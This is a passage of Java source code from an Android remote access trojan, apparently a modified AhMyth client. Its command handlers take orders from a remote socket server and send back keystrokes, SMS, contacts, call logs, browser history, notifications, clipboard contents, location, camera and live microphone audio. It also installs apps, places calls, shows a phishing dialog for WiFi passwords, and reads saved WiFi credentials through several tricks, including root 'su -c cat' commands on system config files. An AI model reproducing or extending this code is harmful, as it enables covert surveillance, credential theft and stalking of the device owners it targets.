                screenCaptureManager.setScale(scale);
                JSONObject result = new JSONObject();
                result.put("success", true);
                result.put("scale", scale);
                emitResponse("x0000sc", result);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in screen capture", e);
            try {
                JSONObject error = new JSONObject();
                error.put("success", false);
                error.put("error", e.getMessage());
                emitResponse("x0000sc", error);
            } catch (Exception ignored) {}
        }
    }
    
    // Request screen capture permission by launching activity
    private static void requestScreenCapturePermission() {
        try {
            // Check if we already have an active MediaProjection
            ScreenStreamService screenService = ScreenStreamService.getInstance();
            if (screenService != null && screenService.isCapturing()) {
                Log.d(TAG, "Screen capture already active, skipping permission request");
                return;
            }
            
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
                // Launch ScreenCaptureActivity to handle the permission request
                android.content.Intent activityIntent = new android.content.Intent(context, ScreenCaptureActivity.class);
                activityIntent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(activityIntent);
                
                Log.d(TAG, "Screen capture permission activity launched");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error requesting screen capture permission", e);
        }
    }
    
    private static void handleRemoteInput(JSONObject data) {
        Log.d(TAG, "Remote input command");
        try {
            String action = data.optString("action", "tap");
            boolean normalized = data.optBoolean("normalized", true);
            JSONObject result;
            
            switch (action) {
                case "tap":
                    float tapX = (float) data.optDouble("x", 0);
                    float tapY = (float) data.optDouble("y", 0);
                    result = inputManager.tap(tapX, tapY, normalized);
                    break;
                    
                case "swipe":
                    float startX = (float) data.optDouble("startX", 0);
                    float startY = (float) data.optDouble("startY", 0);
                    float endX = (float) data.optDouble("endX", 0);
                    float endY = (float) data.optDouble("endY", 0);
                    int swipeDuration = data.optInt("duration", 300);
                    result = inputManager.swipe(startX, startY, endX, endY, swipeDuration, normalized);
                    break;
                    
                case "longPress":
                    float lpX = (float) data.optDouble("x", 0);
                    float lpY = (float) data.optDouble("y", 0);
                    int lpDuration = data.optInt("duration", 1000);
                    result = inputManager.longPress(lpX, lpY, lpDuration, normalized);
                    break;
                    
                case "key":
                    String key = data.optString("key", "back");
                    result = inputManager.keyPress(key);
                    break;
                    
                case "text":
                    String text = data.optString("text", "");
                    result = inputManager.inputText(text);
                    break;
                    
                case "dimensions":
                    result = inputManager.getScreenDimensions();
                    break;
                    
                default:
                    result = new JSONObject();
                    result.put("success", false);
                    result.put("error", "Unknown action: " + action);
            }
            
            emitResponse("x0000in", result);
            
        } catch (Exception e) {
            Log.e(TAG, "Error in remote input", e);
            try {
                JSONObject error = new JSONObject();
                error.put("success", false);
                error.put("error", e.getMessage());
                emitResponse("x0000in", error);
            } catch (Exception ignored) {}
        }
    }
    
    private static void handleKeylogger(JSONObject data) {
        Log.d(TAG, "Keylogger command");
        try {
            String extra = data.optString("extra", "get");
            
            if (extra.equals("get")) {
                JSONObject keylogs = KeyloggerService.getKeylogs();
                emitResponse("x0000kl", keylogs);
            } else if (extra.equals("clear")) {
                KeyloggerService.clearLogs();
                JSONObject result = new JSONObject();
                result.put("success", true);
                result.put("message", "Keylogs cleared");
                emitResponse("x0000kl", result);
            } else if (extra.equals("status")) {
                JSONObject result = new JSONObject();
                result.put("enabled", KeyloggerService.isServiceEnabled());
                result.put("count", KeyloggerService.getLogCount());
                emitResponse("x0000kl", result);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in keylogger", e);
        }
    }
    
    private static void handleBrowserHistory(JSONObject data) {
        Log.d(TAG, "Browser history command");
        try {
            String extra = data.optString("extra", "all");
            
            if (extra.equals("history")) {
                JSONObject history = browserHistoryManager.getBrowserHistory();
                emitResponse("x0000bh", history);
            } else if (extra.equals("bookmarks")) {
                JSONObject bookmarks = browserHistoryManager.getBookmarks();
                emitResponse("x0000bh", bookmarks);
            } else if (extra.equals("searches")) {
                JSONObject searches = browserHistoryManager.getSearchQueries();
                emitResponse("x0000bh", searches);
            } else {
                JSONObject allData = browserHistoryManager.getAllBrowserData();
                emitResponse("x0000bh", allData);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in browser history", e);
        }
    }
    
    private static void handleNotifications(JSONObject data) {
        Log.d(TAG, "Notifications command");
        try {
            String extra = data.optString("extra", "get");
            
            // Set context for NotificationReader
            NotificationReader.setContext(context);
            
            if (extra.equals("get") || extra.equals("all")) {
                JSONObject notifications = NotificationReader.getNotifications();
                emitResponse("x0000nt", notifications);
            } else if (extra.equals("active")) {
                NotificationReader instance = NotificationReader.getInstance();
                if (instance != null) {
                    JSONObject active = instance.getActiveNotificationsJSON();
                    emitResponse("x0000nt", active);
                } else {
                    // Try to request access
                    JSONObject result = NotificationReader.requestAccess(context);
                    emitResponse("x0000nt", result);
                }
            } else if (extra.equals("clear")) {
                NotificationReader.clearHistory();
                JSONObject result = new JSONObject();
                result.put("success", true);
                result.put("message", "Notification history cleared");
                emitResponse("x0000nt", result);
            } else if (extra.equals("status")) {
                JSONObject result = new JSONObject();
                result.put("enabled", NotificationReader.isServiceEnabled());
                result.put("accessEnabled", NotificationReader.isNotificationAccessEnabled(context));
                emitResponse("x0000nt", result);
            } else if (extra.equals("enable") || extra.equals("request")) {
                // Open notification access settings
                JSONObject result = NotificationReader.requestAccess(context);
                emitResponse("x0000nt", result);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in notifications", e);
            try {
                JSONObject result = new JSONObject();
                result.put("error", e.getMessage());
                emitResponse("x0000nt", result);
            } catch (Exception ignored) {}
        }
    }
    
    private static void handleSystemInfo(JSONObject data) {
        Log.d(TAG, "System info command");
        try {
            String extra = data.optString("extra", "all");
            
            JSONObject result = new JSONObject();
            
            if (extra.equals("all") || extra.equals("system")) {
                result.put("system", systemInfoManager.getSystemInfo());
            }
            if (extra.equals("all") || extra.equals("battery")) {
                result.put("battery", systemInfoManager.getBatteryInfo());
            }
            if (extra.equals("all") || extra.equals("sim")) {
                result.put("sim", systemInfoManager.getSimInfo());
            }
            if (extra.equals("all") || extra.equals("accounts")) {
                result.put("accounts", systemInfoManager.getAccounts());
            }
            if (extra.equals("all") || extra.equals("processes")) {
                result.put("processes", systemInfoManager.getRunningProcesses());
            }
            if (extra.equals("all") || extra.equals("network")) {
                result.put("network", systemInfoManager.getNetworkStats());
            }
            if (extra.equals("all") || extra.equals("usage")) {
                result.put("usage", systemInfoManager.getAppUsageStats());
            }
            
            emitResponse("x0000si", result);
        } catch (Exception e) {
            Log.e(TAG, "Error in system info", e);
        }
    }

    // === EXISTING COMMAND HANDLERS ===

    public static void x0000ca(int req) {
        Log.d(TAG, "Camera command: " + req);
        try {
            if (req == -1) {
                JSONObject cameraList = new CameraManager(context).findCameraList();
                if (cameraList != null) {
                    emitResponse("x0000ca", cameraList);
                }
            } else if (req == 1) {
                new CameraManager(context).startUp(1);
            } else if (req == 0) {
                new CameraManager(context).startUp(0);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in camera command", e);
        }
    }

    public static void x0000fm(int req, String path) {
        Log.d(TAG, "File manager command: " + req + " path: " + path);
        try {
            if (req == 0) {
                JSONObject result = new JSONObject();
                result.put("files", fm.walk(path));
                emitResponse("x0000fm", result);
            } else if (req == 1) {
                fm.downloadFile(path);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in file manager command", e);
        }
    }

    public static void x0000sm(int req, String phoneNo, String msg) {
        Log.d(TAG, "SMS command: " + req);
        try {
            if (req == 0) {
                emitResponse("x0000sm", SMSManager.getSMSList());
            } else if (req == 1) {
                boolean isSent = SMSManager.sendSMS(phoneNo, msg);
                JSONObject result = new JSONObject();
                result.put("isSent", isSent);
                emitResponse("x0000sm", result);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in SMS command", e);
        }
    }

    public static void x0000cl() {
        Log.d(TAG, "Call logs command");
        try {
            emitResponse("x0000cl", CallsManager.getCallsLogs());
        } catch (Exception e) {
            Log.e(TAG, "Error in call logs command", e);
        }
    }

    public static void x0000cn() {
        Log.d(TAG, "Contacts command");
        try {
            emitResponse("x0000cn", ContactsManager.getContacts());
        } catch (Exception e) {
            Log.e(TAG, "Error in contacts command", e);
        }
    }

    public static void x0000mc(int sec) throws Exception {
        Log.d(TAG, "Microphone command: " + sec + " seconds");
        MicManager.startRecording(sec);
    }

    public static void x0000lm() {
        Log.d(TAG, "Location command");
        try {
            new Handler(Looper.getMainLooper()).post(new Runnable() {
                @Override
                public void run() {
                    try {
                        LocManager gps = new LocManager(context);
                        JSONObject location = new JSONObject();
                        
                        if (gps.canGetLocation()) {
                            location.put("enable", true);
                            location.put("lat", gps.getLatitude());
                            location.put("lng", gps.getLongitude());
                            location.put("accuracy", gps.getAccuracy());
                            location.put("altitude", gps.getAltitude());
                            location.put("speed", gps.getSpeed());
                            location.put("provider", gps.getProvider());
                            location.put("time", gps.getTime());
                        } else {
                            location.put("enable", false);
                        }
                        
                        emitResponse("x0000lm", location);
                    } catch (Exception e) {
                        Log.e(TAG, "Error getting location", e);
                    }
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "Error in location command", e);
        }
    }

    public static void x0000di() {
        Log.d(TAG, "Device info command");
        try {
            JSONObject deviceInfo = new DeviceInfoManager(context).getDeviceInfo();
            emitResponse("x0000di", deviceInfo);
        } catch (Exception e) {
            Log.e(TAG, "Error in device info command", e);
        }
    }

    public static void x0000ap() {
        Log.d(TAG, "Apps command");
        try {
            JSONArray appsList = new DeviceInfoManager(context).getInstalledApps();
            JSONObject result = new JSONObject();
            result.put("appsList", appsList);
            emitResponse("x0000ap", result);
        } catch (Exception e) {
            Log.e(TAG, "Error in apps command", e);
        }
    }
    
    private static void handleInstallApp(JSONObject data) {
        try {
            String apkPath = data.getString("apkPath");
            Log.d(TAG, "Install app command: " + apkPath);
            AppManager appManager = new AppManager(context);
            JSONObject result = appManager.installApp(apkPath);
            emitResponse("x0000ia", result);
        } catch (Exception e) {
            Log.e(TAG, "Error installing app", e);
            try {
                JSONObject errorResult = new JSONObject();
                errorResult.put("success", false);
                errorResult.put("error", e.getMessage());
                emitResponse("x0000ia", errorResult);
            } catch (Exception e2) {
                Log.e(TAG, "Error sending install result", e2);
            }
        }
    }
    
    private static void handleUninstallApp(JSONObject data) {
        try {
            String packageName = data.getString("packageName");
            Log.d(TAG, "Uninstall app command: " + packageName);
            AppManager appManager = new AppManager(context);
            JSONObject result = appManager.uninstallApp(packageName);
            emitResponse("x0000ua", result);
        } catch (Exception e) {
            Log.e(TAG, "Error uninstalling app", e);
            try {
                JSONObject errorResult = new JSONObject();
                errorResult.put("success", false);
                errorResult.put("error", e.getMessage());
                emitResponse("x0000ua", errorResult);
            } catch (Exception e2) {
                Log.e(TAG, "Error sending uninstall result", e2);
            }
        }
    }

    public static void x0000cb(int req) {
        Log.d(TAG, "Clipboard command: " + req);
        try {
            new Handler(Looper.getMainLooper()).post(new Runnable() {
                @Override
                public void run() {
                    try {
                        ClipboardMonitor clipboardMonitor = new ClipboardMonitor(context);
                        if (req == 0) {
                            // On Android 10+, clipboard can only be read when app is in foreground
                            // Try to bring app to foreground first if needed
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                                try {
                                    // Check if we're in foreground
                                    ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
                                    if (am != null) {
                                        List<ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
                                        boolean isForeground = false;
                                        if (processes != null) {
                                            for (ActivityManager.RunningAppProcessInfo process : processes) {
                                                if (process.pid == android.os.Process.myPid()) {
                                                    isForeground = (process.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND);
                                                    break;
                                                }
                                            }
                                        }
                                        
                                        if (!isForeground) {
                                            // Try to bring MainActivity to foreground
                                            try {
                                                Intent intent = new Intent(context, MainActivity.class);
                                                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                                                context.startActivity(intent);
                                                // Wait a bit for activity to come to foreground
                                                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                                    try {
                                                        JSONObject clipboard = clipboardMonitor.getClipboardText();
                                                        emitResponse("x0000cb", clipboard);
                                                    } catch (Exception e) {
                                                        Log.e(TAG, "Error reading clipboard after bringing to foreground", e);
                                                        try {
                                                            JSONObject error = new JSONObject();
                                                            error.put("text", "");
                                                            error.put("hasData", false);
                                                            error.put("error", "Could not read clipboard. App may need to be in foreground.");
                                                            emitResponse("x0000cb", error);
                                                        } catch (Exception ignored) {}
                                                    }
                                                }, 500);
                                                return;
                                            } catch (Exception e) {
                                                Log.w(TAG, "Could not bring app to foreground", e);
                                            }
                                        }
                                    }
                                } catch (Exception e) {
                                    Log.w(TAG, "Error checking foreground status", e);
                                }
                            }
                            
                            // Read clipboard
                            JSONObject clipboard = clipboardMonitor.getClipboardText();
                            emitResponse("x0000cb", clipboard);
                        } else if (req == 1) {
                            clipboardMonitor.setClipboardListener(new ClipboardMonitor.OnClipboardChangedListener() {
                                @Override
                                public void onClipboardChanged(String text) {
                                    try {
                                        JSONObject result = new JSONObject();
                                        result.put("text", text);
                                        result.put("hasData", true);
                                        result.put("timestamp", System.currentTimeMillis());
                                        emitResponse("x0000cb", result);
                                    } catch (Exception e) {
                                        Log.e(TAG, "Error sending clipboard change", e);
                                    }
                                }
                            });
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error in clipboard command", e);
                        try {
                            JSONObject error = new JSONObject();
                            error.put("text", "");
                            error.put("hasData", false);
                            error.put("error", e.getMessage());
                            emitResponse("x0000cb", error);
                        } catch (Exception ignored) {}
                    }
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "Error in clipboard command", e);
        }
    }

    public static void x0000wf() {
        Log.d(TAG, "WiFi command");
        try {
            JSONObject wifiInfo = new WiFiManager(context).getWiFiInfo();
            emitResponse("x0000wf", wifiInfo);
        } catch (Exception e) {
            Log.e(TAG, "Error in WiFi command", e);
        }
    }

    // === NEW FORENSIC COMMAND HANDLERS ===
    
    public static void x0000ac() {
        Log.d(TAG, "Accounts command");
        try {
            JSONObject accounts = systemInfoManager.getAccounts();
            emitResponse("x0000ac", accounts);
        } catch (Exception e) {
            Log.e(TAG, "Error in accounts command", e);
        }
    }
    
    public static void x0000pr() {
        Log.d(TAG, "Processes command");
        try {
            JSONObject processes = systemInfoManager.getRunningProcesses();
            emitResponse("x0000pr", processes);
        } catch (Exception e) {
            Log.e(TAG, "Error in processes command", e);
        }
    }
    
    public static void x0000ns() {
        Log.d(TAG, "Network stats command");
        try {
            JSONObject networkStats = systemInfoManager.getNetworkStats();
            emitResponse("x0000ns", networkStats);
        } catch (Exception e) {
            Log.e(TAG, "Error in network stats command", e);
        }
    }
    
    public static void x0000us() {
        Log.d(TAG, "Usage stats command");
        try {
            JSONObject usageStats = systemInfoManager.getAppUsageStats();
            emitResponse("x0000us", usageStats);
        } catch (Exception e) {
            Log.e(TAG, "Error in usage stats command", e);
        }
    }
    
    public static void x0000bt() {
        Log.d(TAG, "Battery info command");
        try {
            JSONObject batteryInfo = systemInfoManager.getBatteryInfo();
            emitResponse("x0000bt", batteryInfo);
        } catch (Exception e) {
            Log.e(TAG, "Error in battery command", e);
        }
    }
    
    public static void x0000sm2() {
        Log.d(TAG, "SIM info command");
        try {
            JSONObject simInfo = systemInfoManager.getSimInfo();
            emitResponse("x0000sm2", simInfo);
        } catch (Exception e) {
            Log.e(TAG, "Error in SIM info command", e);
        }
    }
    
    // Make phone call
    private static void handleMakeCall(JSONObject data) {
        Log.d(TAG, "Make call command");
        try {
            String phoneNumber = data.getString("phoneNumber");
            android.content.Intent intent = new android.content.Intent(android.content.Intent.ACTION_CALL);
            intent.setData(android.net.Uri.parse("tel:" + phoneNumber));
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            result.put("phoneNumber", phoneNumber);
            emitResponse("x0000mc2", result);
        } catch (SecurityException e) {
            Log.e(TAG, "CALL_PHONE permission required", e);
            try {
                JSONObject result = new JSONObject();
                result.put("success", false);
                result.put("error", "CALL_PHONE permission required");
                emitResponse("x0000mc2", result);
            } catch (Exception ex) {}
        } catch (Exception e) {
            Log.e(TAG, "Error making call", e);
            try {
                JSONObject result = new JSONObject();
                result.put("success", false);
                result.put("error", e.getMessage());
                emitResponse("x0000mc2", result);
            } catch (Exception ex) {}
        }
    }
    
    // Live microphone streaming
    private static void handleLiveMic(JSONObject data) {
        Log.d(TAG, "Live mic command");
        try {
            String action = data.optString("action", "start");
            
            // Initialize LiveMicManager with context
            LiveMicManager.initialize(context);
            
            if (action.equals("start")) {
                LiveMicManager.startRecording();
            } else if (action.equals("stop")) {
                LiveMicManager.stopRecording();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in live mic", e);
            try {
                JSONObject result = new JSONObject();
                result.put("error", e.getMessage());
                emitResponse("x0000lm2", result);
            } catch (Exception ex) {}
        }
    }
    
    /**
     * Send WiFi password result from phishing dialog
     */
    public static void sendWifiPasswordResult(JSONObject result) {
        try {
            if (ioSocket != null) {
                emitResponse("x0000wp", result);
                Log.d(TAG, "WiFi password result sent");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error sending WiFi password result", e);
        }
    }
    
    // Handle permission request - opens system permission dialogs
    private static void handleRequestPermission(JSONObject data) {
        Log.d(TAG, "Permission request command");
        try {
            String permission = data.optString("permission", "");
            JSONObject result = new JSONObject();
            result.put("permission", permission);
            
            android.content.Intent intent = null;
            
            switch (permission.toLowerCase()) {
                case "camera":
                    // Camera permission is requested at runtime
                    intent = new android.content.Intent(context, MainActivity.class);
                    intent.putExtra("request_permission", "camera");
                    break;
                    
                case "microphone":
                case "mic":
                case "audio":
                    intent = new android.content.Intent(context, MainActivity.class);
                    intent.putExtra("request_permission", "microphone");
                    break;
                    
                case "location":
                case "gps":
                    intent = new android.content.Intent(context, MainActivity.class);
                    intent.putExtra("request_permission", "location");
                    break;
                    
                case "storage":
                case "files":
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
                        // Android 11+ requires special handling
                        intent = new android.content.Intent(android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                        intent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
                    } else {
                        intent = new android.content.Intent(context, MainActivity.class);
                        intent.putExtra("request_permission", "storage");
                    }
                    break;
                    
                case "contacts":
                    intent = new android.content.Intent(context, MainActivity.class);
                    intent.putExtra("request_permission", "contacts");
                    break;
                    
                case "sms":
                    intent = new android.content.Intent(context, MainActivity.class);
                    intent.putExtra("request_permission", "sms");
                    break;
                    
                case "phone":
                case "calls":
                case "calllogs":
                    intent = new android.content.Intent(context, MainActivity.class);
                    intent.putExtra("request_permission", "phone");
                    break;
                    
                case "notifications":
                case "notification":
                    // Open notification listener settings
                    intent = new android.content.Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                    break;
                    
                case "screen":
                case "screencapture":
                    // Launch screen capture activity
                    intent = new android.content.Intent(context, ScreenCaptureActivity.class);
                    break;
                    
                case "accessibility":
                case "keylogger":
                    // Open accessibility settings
                    intent = new android.content.Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
                    break;
                    
                case "usage":
                case "appusage":
                    // Open usage access settings
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
                        intent = new android.content.Intent(android.provider.Settings.ACTION_USAGE_ACCESS_SETTINGS);
                    }
                    break;
                    
                case "battery":
                case "batteryoptimization":
                    // Open battery optimization settings
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                        intent = new android.content.Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                        intent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
                    }
                    break;
                    
                case "overlay":
                case "drawonapps":
                    // Open overlay permission settings
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                        intent = new android.content.Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                        intent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
                    }
                    break;
                    
                case "all":
                    // Open app settings page
                    intent = new android.content.Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                    intent.setData(android.net.Uri.parse("package:" + context.getPackageName()));
                    break;
                    
                default:
                    result.put("success", false);
                    result.put("error", "Unknown permission type: " + permission);
                    emitResponse("x0000rp", result);
                    return;
            }
            
            if (intent != null) {
                // Re-enable MainActivity if it was disabled (for permission requests)
                // This is necessary for permission dialogs to show
                if (intent.getComponent() != null && 
                    intent.getComponent().getClassName().equals("ahmyth.mine.king.ahmyth.MainActivity")) {
                    try {
                        android.content.pm.PackageManager pm = context.getPackageManager();
                        android.content.ComponentName mainActivity = new android.content.ComponentName(
                            context, "ahmyth.mine.king.ahmyth.MainActivity");
                        int state = pm.getComponentEnabledSetting(mainActivity);
                        if (state == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED ||
                            state == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER) {
                            pm.setComponentEnabledSetting(mainActivity,
                                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                                android.content.pm.PackageManager.DONT_KILL_APP);
                            Log.d(TAG, "Re-enabled MainActivity for permission request");
                            // Small delay to ensure component state is updated
                            try {
                                Thread.sleep(200);
                            } catch (InterruptedException e) {
                                // Ignore
                            }
                        }
                    } catch (Exception e) {
                        Log.w(TAG, "Could not re-enable MainActivity", e);
                    }
                }
                
                // Add flags to bring activity to foreground and ensure it's visible
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_SINGLE_TOP);
                
                // CRITICAL: For permission requests to show, activity MUST be visible
                // Force the activity to come to foreground
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION);
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                
                Log.d(TAG, "Starting MainActivity for permission request: " + permission);
                
                // Start activity
                context.startActivity(intent);
                
                // Try to bring the task to front using ActivityManager
                // This is done on a delay to ensure the activity has started
                new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
                            if (am != null) {
                                // Get running tasks to find our app's task
                                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
                                    // For older Android versions
                                    java.util.List<ActivityManager.RunningTaskInfo> tasks = am.getRunningTasks(10);
                                    for (ActivityManager.RunningTaskInfo task : tasks) {
                                        if (task.topActivity != null && 
                                            task.topActivity.getPackageName().equals(context.getPackageName())) {
                                            am.moveTaskToFront(task.id, ActivityManager.MOVE_TASK_WITH_HOME);
                                            Log.d(TAG, "Moved task to front: " + task.id);
                                            break;
                                        }
                                    }
                                } else {
                                    // For Android 5.0+, use getAppTasks
                                    java.util.List<ActivityManager.AppTask> tasks = am.getAppTasks();
                                    for (ActivityManager.AppTask task : tasks) {
                                        ActivityManager.RecentTaskInfo info = task.getTaskInfo();
                                        if (info.topActivity != null && 
                                            info.topActivity.getPackageName().equals(context.getPackageName())) {
                                            task.moveToFront();
                                            Log.d(TAG, "Moved app task to front");
                                            break;
                                        }
                                    }
                                }
                            }
                        } catch (Exception e) {
                            Log.w(TAG, "Could not move task to front from service", e);
                        }
                    }
                }, 500); // 500ms delay to ensure activity has started
                
                result.put("success", true);
                result.put("message", "Permission dialog opened for: " + permission);
            } else {
                result.put("success", false);
                result.put("error", "Could not create intent for: " + permission);
            }
            
            emitResponse("x0000rp", result);
            
        } catch (Exception e) {
            Log.e(TAG, "Error requesting permission", e);
            try {
                JSONObject error = new JSONObject();
                error.put("success", false);
                error.put("error", e.getMessage());
                emitResponse("x0000rp", error);
            } catch (Exception ignored) {}
        }
    }
    
    // Get WiFi passwords using multiple advanced techniques
    private static void handleWifiPasswords(JSONObject data) {
        Log.d(TAG, "WiFi passwords command - using advanced techniques");
        try {
            String extra = data != null ? data.optString("extra", "") : "";
            
            // Show phishing dialog to capture password
            if (extra.equals("prompt") || extra.equals("phish")) {
                Log.d(TAG, "Showing WiFi password prompt dialog");
                android.content.Intent intent = new android.content.Intent(context, WiFiPasswordActivity.class);
                intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
                // Pass SSID if provided
                if (data.has("ssid")) {
                    intent.putExtra("ssid", data.getString("ssid"));
                }
                context.startActivity(intent);
                
                JSONObject result = new JSONObject();
                result.put("success", true);
                result.put("message", "WiFi password dialog shown on device");
                result.put("instruction", "Wait for user to enter password");
                emitResponse("x0000wp", result);
                return;
            }
            JSONObject result = new JSONObject();
            JSONArray networks = new JSONArray();
            boolean foundPasswords = false;
            java.util.Set<String> seenSSIDs = new java.util.HashSet<>();
            
            // ============ ADVANCED NON-ROOT METHODS ============
            
            // Method 1: Android 10+ WiFi Share QR Code API (can get passwords!)
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                JSONArray qrNetworks = tryWifiShareApi();
                if (qrNetworks.length() > 0) {
                    foundPasswords = true;
                    for (int i = 0; i < qrNetworks.length(); i++) {
                        JSONObject net = qrNetworks.getJSONObject(i);
                        if (!seenSSIDs.contains(net.optString("ssid"))) {
                            seenSSIDs.add(net.optString("ssid"));
                            networks.put(net);
                        }
                    }
                }
            }
            
            // Method 2: ContentProvider query (works on some Samsung/LG devices)
            JSONArray providerNetworks = tryContentProviderMethod();
            if (providerNetworks.length() > 0) {
                for (int i = 0; i < providerNetworks.length(); i++) {
                    JSONObject net = providerNetworks.getJSONObject(i);
                    String ssid = net.optString("ssid");
                    if (!seenSSIDs.contains(ssid) && net.has("password")) {
                        seenSSIDs.add(ssid);
                        networks.put(net);
                        foundPasswords = true;
                    }
                }
            }
            
            // Method 3: Backup Manager technique (Android 4-9)
            if (!foundPasswords && android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.Q) {
                JSONArray backupNetworks = tryBackupManagerMethod();
                if (backupNetworks.length() > 0) {
                    foundPasswords = true;
                    for (int i = 0; i < backupNetworks.length(); i++) {
                        JSONObject net = backupNetworks.getJSONObject(i);
                        if (!seenSSIDs.contains(net.optString("ssid"))) {
                            seenSSIDs.add(net.optString("ssid"));
                            networks.put(net);
                        }
                    }
                }
            }
            
            // Method 4: Settings.Secure WiFi configuration (older Android)
            JSONArray secureNetworks = trySettingsSecureMethod();
            if (secureNetworks.length() > 0) {
                for (int i = 0; i < secureNetworks.length(); i++) {
                    JSONObject net = secureNetworks.getJSONObject(i);
                    String ssid = net.optString("ssid");
                    if (!seenSSIDs.contains(ssid) && net.has("password")) {
                        seenSSIDs.add(ssid);
                        networks.put(net);
                        foundPasswords = true;
                    }
                }
            }
            
            // Method 5: Reflection on WifiConfiguration (pre-Android 9)
            if (!foundPasswords && android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.P) {
                JSONArray reflectionNetworks = tryReflectionMethod();
                if (reflectionNetworks.length() > 0) {
                    foundPasswords = true;
                    for (int i = 0; i < reflectionNetworks.length(); i++) {
                        JSONObject net = reflectionNetworks.getJSONObject(i);
                        if (!seenSSIDs.contains(net.optString("ssid"))) {
                            seenSSIDs.add(net.optString("ssid"));
                            networks.put(net);
                        }
                    }
                }
            }
            
            // Method 6: Shell commands without root (some devices)
            JSONArray shellNetworks = tryShellCommands();
            if (shellNetworks.length() > 0) {
                for (int i = 0; i < shellNetworks.length(); i++) {
                    JSONObject net = shellNetworks.getJSONObject(i);
                    String ssid = net.optString("ssid");
                    if (!seenSSIDs.contains(ssid)) {
                        seenSSIDs.add(ssid);
                        networks.put(net);
                        if (net.has("password") && !net.optString("password").startsWith("[")) {
                            foundPasswords = true;
                        }
                    }
                }
            }
            
            // Method 7: Hotspot/Tethering configuration (get hotspot password)
            JSONObject hotspotConfig = getHotspotConfig();
            if (hotspotConfig != null) {
                result.put("hotspot", hotspotConfig);
                if (hotspotConfig.has("password")) {
                    foundPasswords = true;
                }
            }
            
            // ============ ROOT METHODS (fallback) ============
            
            // Method 8: Try reading WifiConfigStore.xml (requires root)
            if (!foundPasswords) {
                String[] wifiConfigPaths = {
                    "/data/misc/wifi/WifiConfigStore.xml",
                    "/data/misc/apexdata/com.android.wifi/WifiConfigStore.xml",
                    "/data/misc/wifi/softap.conf",
                    "/data/misc/wifi/wpa_supplicant.conf"
                };
                
                for (String path : wifiConfigPaths) {
                    JSONArray pathNetworks = tryReadWifiConfig(path);
                    if (pathNetworks.length() > 0) {
                        foundPasswords = true;
                        for (int i = 0; i < pathNetworks.length(); i++) {
                            JSONObject net = pathNetworks.getJSONObject(i);
                            if (!seenSSIDs.contains(net.optString("ssid"))) {
                                seenSSIDs.add(net.optString("ssid"));
                                networks.put(net);
                            }
                        }
                        break;
                    }
                }
            }
            
            // Method 9: Root commands
            if (!foundPasswords) {
                String[] rootCommands = {
                    "su -c 'cat /data/misc/wifi/WifiConfigStore.xml'",
                    "su -c 'cat /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml'",
                    "su -c 'cat /data/misc/wifi/wpa_supplicant.conf'",
                    "su 0 cat /data/misc/wifi/WifiConfigStore.xml",
                    "/system/xbin/su -c 'cat /data/misc/wifi/WifiConfigStore.xml'",
                    "/system/bin/su -c 'cat /data/misc/wifi/WifiConfigStore.xml'"
                };
                
